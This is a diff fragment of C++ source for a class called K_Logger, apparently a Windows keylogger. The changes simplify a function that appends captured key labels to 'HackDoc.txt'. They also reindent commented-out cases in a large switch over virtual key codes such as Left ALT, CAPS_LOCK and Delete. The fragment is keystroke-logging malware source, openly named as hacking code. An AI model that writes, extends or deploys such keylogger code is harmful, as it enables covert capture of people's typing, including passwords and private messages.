@@ -21,19 +21,11 @@ using std::cout;
 void K_Logger::WriteToDoc(LPCSTR text)
 {
 	std::ofstream doc_to;
-	// LPCSTR fileName = "D:\\Hack";
-	// LPCSTR fileNameTo = "D:\\Hack\\Hack.txt";
-	
 
-	/*if (CreateDirectory(fileName, NULL))
-	{
-		if (CreateFile(fileNameTo, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL))
-		{*/
-			doc_to.open("HackDoc.txt", fstream::app);
-			doc_to << text;
-			doc_to.close();	
-	/*	}
-	}*/
+
+	doc_to.open("HackDoc.txt", fstream::app);
+	doc_to << text;
+	doc_to.close();
 }
 
 int K_Logger::SaveSymbol(WORD iKey)
@@ -705,10 +697,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		WriteToDoc("  *Left_ALT*  ");
 		break;
 
-	/*case VK_SNAPSHOT:
-		cout << "  *PRINT_SCREEN*  ";
-		WriteToDoc("  *PRINT_SCREEN*  ");
-		break;*/
+		/*case VK_SNAPSHOT:
+			cout << "  *PRINT_SCREEN*  ";
+			WriteToDoc("  *PRINT_SCREEN*  ");
+			break;*/
 
 	case VK_CAPITAL:
 		cout << "  *CAPS_LOCK*  ";
@@ -775,10 +767,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		WriteToDoc(" btn_ctrl ");
 		break;
 
-	//case VK_INSERT:
-	//	cout << " Insert ";
-	//	WriteToDoc(" Insert ");
-	//	break;
+		//case VK_INSERT:
+		//	cout << " Insert ";
+		//	WriteToDoc(" Insert ");
+		//	break;
 
 	case VK_DELETE:
 		cout << " *Delete* ";
